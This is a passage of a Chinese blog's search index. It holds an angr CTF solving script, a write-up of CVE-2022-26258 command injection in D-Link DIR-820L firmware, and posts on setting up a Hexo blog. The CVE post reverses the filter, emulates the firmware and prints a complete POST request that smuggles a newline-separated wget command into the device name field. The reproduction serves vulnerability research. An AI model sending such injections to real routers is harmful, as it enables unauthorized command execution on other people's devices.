的例子中，为了图方便，没有构造栈的内容，而是越过输入函数直接构造寄存器内容，但有时候我们不得不去构造栈的内容。</p><p>IDA 打开 04_angr_symbolic_stack 二进制文件，<code>scanf</code> 函数完成后直接对输入内容进行操作：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427151637284.png" alt="image-20220427151637284"></p><p>从汇编代码来看，<code>scanf</code> 函数是外平栈，将两个输入内容放入了 EBP-0x10 和 EBP-0xC 的位置：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427152733646.png" alt="image-20220427152733646"></p><p>那么可以从 0x08048697 地址开始绕过 <code>scanf</code> 函数，然后构造这两个栈上的内容。关键在于如何构造这两个内容呢？我们可以利用 EBP 寄存器，因为 EBP 在函数返回之前是不会变动的，并且在函数开始的时候就执行了 <code>MOV EBP, ESP</code>，那么在此基础上，算出 ESP 在我们指定的起始地址前变化多少个字节就可以了。</p><p>直接上代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./04_angr_symbolic_stack"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    start_address <span class="token operator">=</span> <span class="token number">0x08048697</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>    padding_length_in_bytes <span class="token operator">=</span> <span class="token number">8</span>  <span class="token comment"># :integer</span>  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> padding_length_in_bytes    initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password0<span class="token punctuation">)</span>  <span class="token comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>  initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password1<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行得到结果：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427154948561.png" alt="image-20220427154948561"></p>]]></content>
      
      
      
        <tags>
            
            <tag> symbolic execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-26258 命令执行漏洞</title>
      <link href="/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2022/04/25/cve-2022-26258-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="分析固件和漏洞"><a href="#分析固件和漏洞" class="headerlink" title="分析固件和漏洞"></a>分析固件和漏洞</h1><p>D-Link DIR-820L路由器固件版本1.05B03存在命令执行漏洞，CVE编号CVE-2022-26258，通过CVE网站查看信息，得知漏洞在 &#x2F;lan.asp 页面中的设备名称参数出了问题。以下是CVE的描述信息：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392">使用binwalk解包时并未发现加密，直接得到了squashfs-root 文件系统：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141224791.png" alt="image-20220425141224791"></p><p>找到 lan.asp 文件，搜索“device”和“name”相关关键词，发现有多处调用：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">onPageLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> lanCfg<span class="token punctuation">.</span>lanDeviceName<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token keyword">var</span> lan_device_name <span class="token operator">=</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token keyword">function</span> <span class="token function">copyDataToDataModelFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span>paramStr <span class="token operator">+=</span> <span class="token string">'&amp;lanHostCfg_DeviceName_1.1.1.0='</span> <span class="token operator">+</span> <span class="token function">get_by_id</span><span class="token punctuation">(</span><span class="token string">"lan_device_name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>duple<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">show_words('DEVICE_NAME')</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token plain-text">:</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>340<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lan_device_name<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>15<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计代码，发现<code>lan_device_name</code>作为请求参数，拼接到<code>paramStr</code>中，这里应该是一个POST请求，然后将内容提交到了<code>get_set.ccp</code> 的URL中，：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">send_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token keyword">if</span><span class="token punctuation">(</span>submit_button_flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>submit_button_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">/*var restoreStrfor(var i=0; i&lt;25; i++)&#123;&#125;*/</span><span class="token function">deleteRedundentDatamodel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> submitObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ccpObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> submitParam <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"get_set.ccp"</span><span class="token punctuation">,</span><span class="token literal-property property">arg</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在文件系统中使用<code>grep -r get_set .</code> 查找这个URL的引用，并没有发现名为“get_set.ccp”的文件，但有许多asp文件都使用了这个URL，并且有四个二进制文件中匹配到了这个URL：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141254823.png" alt="image-20220425141254823"></p><p>既然没有“get_set.ccp”文件，那么可能是这个URL会交给后端处理，处理好之后返回给用户结果。我们依次分析这四个二进制文件，在文件中搜索字符串”get_set”，结果flash、smbd、libc不是很匹配，可能性较低，而ncc2的内容很匹配，它不光有字符串，还有相关函数，ncc2结果如下：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141320141.png" alt="image-20220425141320141"></p><p>接下来对ncc2进行逆向，搜索<code>system</code>等命令执行函数，发现关键逻辑：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141332645.png" alt="image-20220425141332645"></p><p>这里将v4的值拼接到格式化字符串里，然后整个字符串传给<code>system</code>，目前看来并未对v4进行检查，很有可能是命令注入点。</p><p>v4是<code>getObj</code>函数的返回值Obj，需要绕过<code>hasInjectionString</code>的判断才能到达命令注入点，现在需要找到<code>hasInjectionString</code> 函数在哪个文件中，同样使用<code>grep -r</code> 命令：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141346118.png" alt="image-20220425141346118"></p><p>这里找到一个libc文件，用IDA打开，然后分析此函数，发现它是一个过滤函数，用于判断是否有非法字符：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141357805.png" alt="image-20220425141357805"></p><p>但是这里只是一些基本的过滤规则，没有过滤冒号和换行符，可以使用“\n”来绕过，最终达到命令注入的效果。现在要验证漏洞是否存在，需要进行固件仿真。试了一下FrimAE可以仿真，这样就不需要手动去模拟了，避免了很多麻烦。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先下载FirmAE，然后按照官方文档给出的安装教程把环境安装好：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone --recursive <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE<span class="token operator">></span><span class="token function">sudo</span> ./download.sh<span class="token function">sudo</span> ./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在download的时候速度非常慢，甚至出现连接断掉的情况，可以查看download.sh脚本，然后搭上梯子手动下载到binaries文件夹下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">wget</span> -N --continue -P./binaries/ <span class="token variable">$*</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token string">"Downloading binaries..."</span><span class="token builtin class-name">echo</span> <span class="token string">"Downloading kernel 2.6 (MIPS)..."</span>download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipsel.<span class="token operator"><span class="token file-descriptor important">2</span>></span>download <span class="token operator">&lt;</span>https://github.com/pr0v3rbs/FirmAE_kernel-v2.6/releases/download/v1.0/vmlinux.mipseb.<span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载好之后运行仿真命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./init.sh<span class="token function">sudo</span> ./run.sh -a <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span><span class="token function">sudo</span> ./run.sh -r <span class="token operator">&lt;</span>brand<span class="token operator">></span> <span class="token operator">&lt;</span>firmware<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>-a</code> 这条命令是解析固件，<code>brand</code>参数是一个自定义的标识符，然后跟上firmware.bin文件，<code>-r</code> 这条命令就是运行仿真了。仿真成功可以看到如下信息：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141412340.png" alt="image-20220425141412340"></p><p>然后在浏览器访问192.168.0.1，可以访问成功，这里要求登录，默认密码为空：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141423322.png" alt="image-20220425141423322"></p><p>根据之前的分析结果，访问lan.asp，看到页面确实像预测的那样POST提交表单到get_set.ccp的URL。这里测试修改Device Name然后使用burpsuite抓包看看参数构成：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141433485.png" alt="image-20220425141433485"></p><p>正如之前分析的那样，所有的参数都拼接起来了。然后尝试对此处使用换行符绕过，也就是”%0a”。这里有一个比较简单的验证方法，就是用python 起一个简单的HTTP服务，然后使用wget 命令请求这个HTTP服务，如果成功请求，在终端中就会输出请求的相关信息，并且wget会一直发出请求，用于测试在合适不过了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python -m SimpleHTTPServer <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后修改Device Name这条参数，最后请求头如下：</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;get_set.ccp HTTP&#x2F;1.1Host: 192.168.0.1Content-Length: 765Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36Content-Type: application&#x2F;x-www-form-urlencodedOrigin: &lt;http:&#x2F;&#x2F;192.168.0.1&gt;Referer: &lt;http:&#x2F;&#x2F;192.168.0.1&#x2F;lan.asp&gt;Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q&#x3D;0.9Cookie: hasLogin&#x3D;§1§Connection: closeccp_act&#x3D;§set§&amp;old_ip&#x3D;§192.168.0.1§&amp;old_mask&#x3D;§255.255.255.0§&amp;new_ip&#x3D;§192.168.0.1§&amp;new_mask&#x3D;§255.255.255.0§&amp;nextPage&#x3D;§lan.asp§&amp;lanHostCfg_IPAddress_1.1.1.0&#x3D;§192.168.0.1§&amp;lanHostCfg_SubnetMask_1.1.1.0&#x3D;§255.255.255.0§&amp;lanHostCfg_DomainName_1.1.1.0&#x3D;§§&amp;lanHostCfg_DNSRelay_1.1.1.0&#x3D;§1§&amp;lanHostCfg_DHCPServerEnable_1.1.1.0&#x3D;§1§&amp;lanHostCfg_MinAddress_1.1.1.0&#x3D;§192.168.0.100§&amp;lanHostCfg_MaxAddress_1.1.1.0&#x3D;§192.168.0.200§&amp;lanHostCfg_DHCPLeaseTime_1.1.1.0&#x3D;§1440§&amp;lanHostCfg_DeviceName_1.1.1.0&#x3D;§%0awget &lt;http:&#x2F;&#x2F;192.168.0.2&gt;%0a§&amp;lanHostCfg_AlwaysBroadcast_1.1.1.0&#x3D;§0§&amp;lanHostCfg_NetBIOSAnnouncement_1.1.1.0&#x3D;§0§&amp;lanHostCfg_NetBIOSLearn_1.1.1.0&#x3D;§0§&amp;lanHostCfg_NetBIOSScope_1.1.1.0&#x3D;§§&amp;lanHostCfg_NetBIOSNodeType_1.1.1.0&#x3D;§2§&amp;lanHostCfg_PrimaryWINSAddress_1.1.1.0&#x3D;§0.0.0.0§&amp;lanHostCfg_SecondaryWINSAddress_1.1.1.0&#x3D;§0.0.0.0§&amp;1650509593486&#x3D;§1650509593486§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在终端中看到来自192.168.0.1的请求，说明命令注入成功：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141445337.png" alt="image-20220425141445337"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://iotsec-zone.com/article?id=123">IOTsec-Zone 物联网安全社区 | D-Link CVE-2022-26258 命令注入</a></p><p><a href="https://github.com/skyedai910/Vuln/tree/master/DIR-820L/command_execution_0">Vuln&#x2F;DIR-820L&#x2F;command_execution_0 at master · skyedai910&#x2F;Vuln</a></p><p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26258">CVE - CVE-2022-26258</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建博客</title>
      <link href="/2022/04/24/hexo-da-jian-bo-ke/"/>
      <url>/2022/04/24/hexo-da-jian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="安装配置Hexo"><a href="#安装配置Hexo" class="headerlink" title="安装配置Hexo"></a>安装配置Hexo</h1><p>安装node环境</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> <span class="token function">node</span><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>本地新建文件夹，然后初始化hexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> blog<span class="token builtin class-name">cd</span> bloghexo init blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>blog文件夹为根文件夹，其中配置文件 _config.yml 是配置 hexo 的，另外在 themes 文件夹下也有  _config.yml 文件，是用于配置主题的。</p><p>在GitHub新建仓库，仓库名为 [github用户名].github.io ，修改根文件夹下的 _config.yml 的 deploy 配置，将 repo 改为刚才的仓库路径，type 改为“git”，如下：</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">deploy:  type: &#39;git&#39;  repo: https:&#x2F;&#x2F;github.com&#x2F;unrav31&#x2F;unrav31.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装hexo-deployer-git，这样才能将本地文件部署到github中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随后按顺序输入以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>hexo clean</code>：清除缓存</p><p><code>hexo g</code>：hexo generate，生成</p><p><code>hexo d</code>：hexo deploy，部署到github</p><p>这时候可以在github.io查看到搭建好的项目了。</p><h1 id="配置Hexo主题"><a href="#配置Hexo主题" class="headerlink" title="配置Hexo主题"></a>配置Hexo主题</h1><p>默认主题不是很好看，我这里是用的 <a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">blinkfox</a> ，可以在 <a href="https://hexo.io/themes/">themes</a> 找到自己喜欢的主题。</p><p>进入到 themes 文件夹下，然后下载blinkfox：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> themes<span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改hexo根目录下的 <strong>_config.yml</strong> 文件的 <code>themes</code> 值：</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">theme: hexo-theme-matery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关于 _config.yml 的其他修改建议：</p><ul><li>修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><p>最后在根目录使用一下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上操作就完成更改主题了。</p><p>其他更多的配置修改方法见 <a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">官方手册</a> 。</p><p>效果图：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220424232123575.png?token=ATQEVQUFDYSYS5EO5RXOJILCMYC5K" alt="image-20220424232123575"></p><h1 id="设置图床"><a href="#设置图床" class="headerlink" title="设置图床"></a>设置图床</h1><p>图片在 typora 中是本地文件存储的，在hexo部署之后无法查看图片，这时需要在远程搭建一个图床。</p><p>图床可以有多种方式，我这里选择 github 作为图床，因为它免费。</p><p>首先在 github 新建一个仓库，需要是公开的仓库否则无法查看图片。然后下载 <a href="https://github.com/Molunerfinn/picgo/releases">PicGo</a> 进行设置：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425135339804.png" alt="image-20220425135339804"></p><p>token 就是 github 的访问 token，分支按照创建仓库时的分支填写，仓库名称是 [用户名&#x2F;仓库名] 的形式。</p><p>最后在 typora 设置中设置自动生成图床链接。点击「偏好设置」，设置如下内容：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425135810193.png" alt="image-20220425135810193"></p><p>然后在 typora 中粘贴图片就可以上传到图床啦，最后再次部署hexo，整个过程就完成了。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/26625249">GitHub+Hexo 搭建个人网站详细教程</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">hexo中文手册</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安装环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/24/hello-world/"/>
      <url>/2022/04/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
